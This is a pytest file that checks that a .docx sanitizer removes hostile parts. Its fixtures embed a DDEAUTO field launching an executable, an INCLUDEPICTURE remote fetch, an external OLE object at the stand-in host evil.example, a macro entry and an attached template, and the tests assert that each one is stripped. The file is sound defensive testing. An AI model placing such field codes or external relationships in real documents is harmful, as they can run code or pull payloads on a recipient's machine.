"""Unconditional category-stripping of .docx uploads."""
import io
import zipfile

from formatting.sanitize import sanitize_docx
from .docx_factory import build_docx, para

EXTERNAL_RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vbaProject" Target="vbaProject.bin"/>
<Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="https://evil.example/x.bin" TargetMode="External"/>
<Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org/" TargetMode="External"/>
</Relationships>"""

SETTINGS = (
    '<?xml version="1.0"?>'
    '<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    '<w:attachedTemplate r:id="rId9"/><w:zoom w:percent="100"/></w:settings>'
)


def _docx_with_nasties():
    body = (
        para("Hello")
        + '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\evil.exe "><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>'
        + '<w:p><w:r><w:instrText> INCLUDEPICTURE "http://evil/x.png" </w:instrText></w:r></w:p>'
        + para("Bye")
    )
    return build_docx(
        body,
        extra_entries={
            "word/vbaProject.bin": b"MACROS",
            "word/embeddings/oleObject1.bin": b"OLE",
            "word/activeX/activeX1.xml": b"<ocx/>",
            "word/_rels/document.xml.rels": EXTERNAL_RELS,
            "word/settings.xml": SETTINGS,
        },
    )


def test_macro_ole_activex_entries_removed():
    clean = sanitize_docx(_docx_with_nasties())
    names = zipfile.ZipFile(io.BytesIO(clean)).namelist()
    assert "word/vbaProject.bin" not in names
    assert not any(n.startswith("word/embeddings/") for n in names)
    assert not any(n.startswith("word/activeX/") for n in names)
    assert "word/document.xml" in names  # document itself survives


def test_dde_and_include_fields_neutralized():
    clean = sanitize_docx(_docx_with_nasties())
    doc = zipfile.ZipFile(io.BytesIO(clean)).read("word/document.xml").decode()
    assert "DDEAUTO" not in doc
    assert "INCLUDEPICTURE" not in doc
    assert "Hello" in doc and "Bye" in doc  # content untouched


def test_external_rels_stripped_but_hyperlinks_kept():
    clean = sanitize_docx(_docx_with_nasties())
    rels = zipfile.ZipFile(io.BytesIO(clean)).read("word/_rels/document.xml.rels").decode()
    assert "vbaProject" not in rels
    assert "evil.example" not in rels
    assert "example.org" in rels  # plain hyperlink survives


def test_attached_template_removed_from_settings():
    clean = sanitize_docx(_docx_with_nasties())
    settings = zipfile.ZipFile(io.BytesIO(clean)).read("word/settings.xml").decode()
    assert "attachedTemplate" not in settings
    assert "zoom" in settings


def test_not_a_zip_rejected():
    import pytest

    with pytest.raises(ValueError):
        sanitize_docx(b"MZ this is not a docx")
